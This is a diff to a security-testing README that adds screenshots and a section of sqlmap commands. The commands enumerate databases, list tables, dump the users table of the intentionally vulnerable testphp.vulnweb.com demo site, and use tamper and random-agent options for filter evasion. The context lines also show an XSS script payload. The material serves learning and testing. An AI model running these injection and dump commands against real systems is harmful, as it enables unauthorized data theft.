@@ -30,6 +30,8 @@ This repository focuses on **functional, performance, and security testing** for
 | **Weak Session Management** | Open to session hijacking | ❌ Vulnerable |
 | **Parameter Tampering** | Modify cart price | ❌ Vulnerable |
 
+![Image](https://github.com/user-attachments/assets/a447f3ef-c048-4734-b719-081e44b4eaac)
+
 ---
 
 ## ⚡ 2. Performance Testing
@@ -50,6 +52,8 @@ Performance testing was conducted using **K6 Load Testing Framework**.
 | 300       | 1350ms               | 24.5%         | ❌ Unstable  |
 | 400       | 2600ms               | 35%           | ❌ Crashed  |
 
+![Image](https://github.com/user-attachments/assets/f369aac4-eec2-44e9-a161-b7ea1bf31416)
+
 ---
 
 ## 🛠 3. Tests
@@ -61,6 +65,7 @@ Performance testing was conducted using **K6 Load Testing Framework**.
 ```bash
 sqlmap -u "http://testphp.vulnweb.com/login.php" --dbs --batch --risk=3 --level=5
 ```
+
 #### XSS Testing (Burp Suite)
 1. Open **Burp Suite**.
 2. Go to **Proxy → Intercept**.
@@ -69,6 +74,16 @@ sqlmap -u "http://testphp.vulnweb.com/login.php" --dbs --batch --risk=3 --level=
    <script>alert('XSS')</script>
    ```
 4. Forward the request and observe execution.
+
+#### Additional SQL Injection Tests
+```bash
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs --random-agent --tamper=space2comment
+```
+
+![Image](https://github.com/user-attachments/assets/211ca92d-7dac-4f74-829e-041ab01fdeaa)
 
 ---
 
@@ -94,3 +109,4 @@ This project is licensed under the **MIT License**.
 ---
 
 🚀 **Contribute to Secure Web Applications!** 🔥
+
